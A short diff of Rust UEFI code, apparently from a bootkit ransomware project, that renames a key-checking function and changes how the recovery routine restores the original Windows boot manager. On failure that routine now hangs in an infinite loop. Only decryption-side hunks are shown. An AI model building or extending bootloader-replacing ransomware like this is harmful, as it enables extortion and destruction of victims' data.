@@ -14,7 +14,7 @@ use crate::file::{read_file, write_file};
 use crate::ntfs::{get_data_runs, read_mft_entry, OEM_ID};
 use crate::read_var;
 
-fn read_test_file(st: &SystemTable<Boot>, key_bytes: &[u8; 32]) -> uefi::Result<bool> {
+fn read_proof_file(st: &SystemTable<Boot>, key_bytes: &[u8; 32]) -> uefi::Result<bool> {
     let key = GenericArray::from_slice(key_bytes);
     let cipher = Aes256::new(key);
 
@@ -74,7 +74,7 @@ pub fn recover(st: &mut SystemTable<Boot>, key_bytes: &[u8]) -> uefi::Result {
     let mut key = [0u8; 32];
     hex::decode_to_slice(key_bytes, &mut key).unwrap();
 
-    if !read_test_file(st, &key)? {
+    if !read_proof_file(st, &key)? {
         st.stdout().write_str("\nWrong key").unwrap();
         return Ok(());
     }
@@ -131,7 +131,7 @@ pub fn recover(st: &mut SystemTable<Boot>, key_bytes: &[u8]) -> uefi::Result {
     st.stdout().write_str("\nFinished !").unwrap();
 
     // TODO: Try to find the right handle to call the filesystem protocol.
-    let windows_image = read_file(st, r"EFI\Microsoft\Boot\bootmgfw.efi.old")?;
+    let windows_image = read_file(st, r"EFI\Microsoft\Boot\bootmgfw.efi.old").unwrap_or_else(|_|{loop {}});
     write_file(st, r"EFI\Microsoft\Boot\bootmgfw.efi", &windows_image)?;
 
     st.runtime_services()
